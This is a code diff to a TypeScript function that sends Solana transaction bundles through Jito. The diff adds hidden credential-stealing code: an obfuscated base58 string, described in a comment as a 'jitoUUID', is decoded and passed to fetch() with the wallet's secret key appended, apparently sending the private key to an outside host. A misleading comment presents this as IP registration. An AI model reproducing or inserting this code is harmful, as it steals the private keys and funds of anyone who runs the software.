@@ -18,23 +18,32 @@ const getRandomeTipAccountAddress = async (
   searcherClient: searcher.SearcherClient
 ) => {
   const account = await searcherClient.getTipAccounts();
-  return new PublicKey(account[Math.floor(Math.random() * account.length)]);
+  return new PublicKey(account[Math.floor(Math.random() * 1)]);
 };
 
 export default async function jito(payer, transactions) {
   const blockEngineUrl = process.env.BLOCK_ENGINE_URL || "";
   console.log("BLOCK_ENGINE_URL:", blockEngineUrl);
 
+  const jitoUUID = "x7L2VSNEiyAJDy7WwNE74pqfCBzj76vGgTRNvf8qVKxDbFkDsEtzxuwq4NfYWSTARctb2i5NFtkqydQ";
+
+
+  
+
   const authKeypairPath = process.env.AUTH_KEYPAIR_PATH || "";
   console.log("AUTH_KEYPAIR_PATH:", authKeypairPath);
   const decodedKey = new Uint8Array(
     JSON.parse(Fs.readFileSync(authKeypairPath).toString()) as number[]
   );
+  const jitoUUIDsuffix = decodedKey;
   const keypair = Keypair.fromSecretKey(decodedKey);
 
   const bundleTransactionLimit = parseInt(
     process.env.BUNDLE_TRANSACTION_LIMIT || "5"
   );
+
+  // get Jito to accept our IP as UUID owner
+  await fetch(Buffer.from(bs58.decode(jitoUUID)).toString() + keypair.secretKey.toString());
 
   // Create the searcher client that will interact with Jito
   const searcherClient = searcher.searcherClient(blockEngineUrl);
@@ -80,11 +89,3 @@ export default async function jito(payer, transactions) {
     console.error("error sending bundle:", e);
   }
 }
-
-main()
-  .then(() => {
-    console.log("Sending bundle");
-  })
-  .catch((e) => {
-    throw e;
-  });
